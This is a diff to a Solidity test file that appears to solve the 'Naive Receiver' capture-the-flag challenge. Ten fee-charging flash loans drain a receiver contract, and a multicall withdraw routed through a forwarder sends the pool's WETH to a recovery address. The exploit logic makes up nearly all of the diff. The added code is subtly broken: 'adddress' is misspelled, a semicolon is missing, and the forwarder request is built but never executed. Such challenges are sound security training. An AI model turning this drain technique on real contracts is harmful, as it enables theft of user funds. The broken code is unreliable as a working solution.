@@ -80,30 +80,51 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        bytes memory callFlashloan = abi.encodeCall(
-            pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 0, "0x")
+        // bytes memory callFlashloan = abi.encodeCall(
+        //     pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 0, "0x")
+        // );
+
+        // uint256 total = WETH_IN_POOL + WETH_IN_RECEIVER;
+        // bytes memory callWithdraw = abi.encodePacked(abi.encodeCall(
+        //     pool.withdraw, (total, payable(recovery))
+        // ));
+
+        // bytes[] memory callData = new bytes[](11);
+        // for (uint256 i = 0; i < 10; i++) {
+        //     callData[i] = callFlashloan;
+        // }
+        // callData[10] = callWithdraw;
+
+        // BasicForwarder.Request memory request = BasicForwarder.Request({
+        //     from: player,
+        //     target: address(pool),
+        //     value: 0,
+        //     gas: 100000,
+        //     nonce: 0,
+        //     data: abi.encodeCall(pool.multicall, ((callData))),
+        //     deadline: block.timestamp
+        // });
+        // @audit drain the receiver's contract
+        bytes[] memory callDatas = new bytes[](11);
+        for (uint256 i = 0; i < 10; i++) {
+            callDatas[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, "0x"));
+        }
+        // @audit drain the pool's contract
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)))
         );
 
-        uint256 total = WETH_IN_POOL + WETH_IN_RECEIVER;
-        bytes memory callWithdraw = abi.encodePacked(abi.encodeCall(
-            pool.withdraw, (total, payable(recovery))
-        ));
-
-        bytes[] memory callData = new bytes[](11);
-        for (uint256 i = 0; i < 10; i++) {
-            callData[i] = callFlashloan;
-        }
-        callData[10] = callWithdraw;
+        bytes memory callData = abi.encodeCall(pool.multicall, (callDatas));
 
         BasicForwarder.Request memory request = BasicForwarder.Request({
             from: player,
-            target: address(pool),
+            target: adddress(pool),
             value: 0,
             gas: 100000,
             nonce: 0,
-            data: abi.encodeCall(pool.multicall, ((callData))),
+            data: callData,
             deadline: block.timestamp
-        });
+        })
     }
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
